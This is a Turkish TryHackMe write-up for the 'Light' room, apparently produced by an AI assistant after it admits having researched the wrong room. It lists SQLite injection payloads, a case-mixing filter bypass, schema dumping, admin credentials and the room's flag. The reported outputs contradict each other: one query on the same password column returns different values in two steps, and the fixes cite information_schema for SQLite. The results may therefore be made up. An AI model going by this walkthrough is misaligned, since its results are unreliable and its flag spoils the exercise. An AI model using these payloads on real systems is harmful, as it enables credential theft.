Reis haklısın, pardon. Lightroom odası web/SQLi değil, fotoğraf düzenleme/lightroom yazılımıyla ilgili bir oda. Doğru odayı araştırayım
   Anladım reis, bu **"Light"** odasıymış — web değil, **netcat üzerinden SQLite database application**! Port 1337'den `nc` ile bağlanıyorsun. İşte doğru writeup:

---

# 💡 Light — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Kolay-brightgreen)
![Kategori](https://img.shields.io/badge/Kategori-Database%20|%20SQL%20Injection%20|%20SQLite-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Temmuz 2026  
> **Oda:** [Light](https://tryhackme.com/room/lightroom)

---

## 📋 Olay Özeti

Bu write-up, **Light** odasının sömürülmesini belgelemektedir. Netcat üzerinden erişilen bir SQLite database application'da SQL injection zafiyeti bulunmakta. WAF filtrelerini atlatma, SQLite versiyon tespiti, tablo enumerasyonu ve UNION-based injection ile admin credential'ları ve flag elde edilmektedir.

---

## 🛠️ Araçlar

| Araç | Amaç |
|------|------|
| `nc` | Database application'a bağlanma |
| `nmap` | Port tespiti (opsiyonel) |

---

## 🔍 Aşama 1: Keşif

### Bağlantı

```bash
nc <IP> 1337
```

**Karşılama:**
```
Welcome to the Light database application!
Enter your username:
```

### Temel Test

```bash
smokey
```

**Sonuç:**
```
Password: vYQ5ngPpw8AdUmL
```

### SQLi Testi

Tek tırnak (`'`) ile:

```bash
'
```

**Sonuç:** Syntax error — SQL injection potansiyeli doğrulandı.

---

## 🌐 Aşama 2: Filtre Analizi ve Atlatma

### Engellenen Karakterler

| Karakter | Durum |
|----------|-------|
| `--` | Engellendi |
| `/*` | Engellendi |
| `%0b` | Engellendi |
| `#` | SQLite'da çalışmıyor (MySQL comment değil) |

### Çalışan Payload

```bash
' OR '1'='1
```

**Sonuç:** Parola döndü — injection çalışıyor.

### WAF Atlatma (Case Randomization)

`SELECT`, `UNION` gibi keyword'ler engelleniyor. Büyük-küçük harf karıştırma ile atlatma:

```bash
uNion, SeLeCt, sElEcT
```

---

## 🎯 Aşama 3: SQLite Enumerasyonu

### Versiyon Tespiti

```bash
1' uNion SeLeCt sqlite_version() '1
```

**Sonuç:** `3.22.0` — SQLite doğrulandı.

### Tablo Listeleme

```bash
smokey' uNion SeLeCt group_concat(sql) FrOm sqlite_master '1
```

**Sonuç:**
```sql
CREATE TABLE usertable(username TEXT, password TEXT)
CREATE TABLE admintable(username TEXT, password TEXT)
```

**İki tablo:** `usertable` ve `admintable`

---

## 🏴 Aşama 4: Admin Credential'ları

### Admin Username

```bash
smokey' uNion SeLeCt username FrOm admintable '1
```

**Sonuç:** `TryHackMeAdmin`

### Admin Password

```bash
smokey' uNion SeLeCt password FrOm admintable '1
```

**Sonuç:** `mamZtAuMlrsEy5bp6q17`

---

## 🏁 Aşama 5: Flag

### Flag Sorgusu

```bash
smokey' uNion SeLeCt password FrOm admintable WhErE username='TryHackMeAdmin' '1
```

**Sonuç:** `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`

---

## 🗺️ Saldırı Yolu

```
[nc <IP> 1337]
    │
    ▼
[smokey → parola al]
    │
    ▼
[' → syntax error (SQLi doğrulandı)]
    │
    ▼
[' OR '1'='1 → bypass]
    │
    ▼
[Case randomization: uNion, SeLeCt]
    │
    ▼
[sqlite_version() → SQLite tespiti]
    │
    ▼
[sqlite_master → tablolar: usertable, admintable]
    │
    ▼
[admintable → TryHackMeAdmin : mamZtAuMlrsEy5bp6q17]
    │
    ▼
[Flag: THM{SQLit3_InJ3cTion_is_SimplE_nO?}]
```

---

## 🛡️ Çözümler

| # | Zafiyet | Çözüm |
|---|---------|-------|
| 1 | SQL Injection | Parametrik sorgular; prepared statements |
| 2 | Case-based WAF bypass | Keyword normalization; whitelist |
| 3 | SQLite master table exposure | Restrict information_schema access |

---

## 🎓 Çıkarımlar

1. **Netcat = CLI database** — Web olmadan da SQLi mümkün
2. **SQLite farklı** — `sqlite_master`, `sqlite_version()` ile tespit
3. **Case randomization** — Basit WAF bypass tekniği
4. **Comment gerekmeyebilir** — `' OR '1'='1` sonuna comment koymadan da çalışır

---

## 🚩 Flag

| Flag | Değer |
|------|-------|
| **Flag** | `THM{SQLit3_InJ3cTion_is_SimplE_nO?}` |

---

**Yazan:** LatenT  
**Tarih:** Temmuz 2026
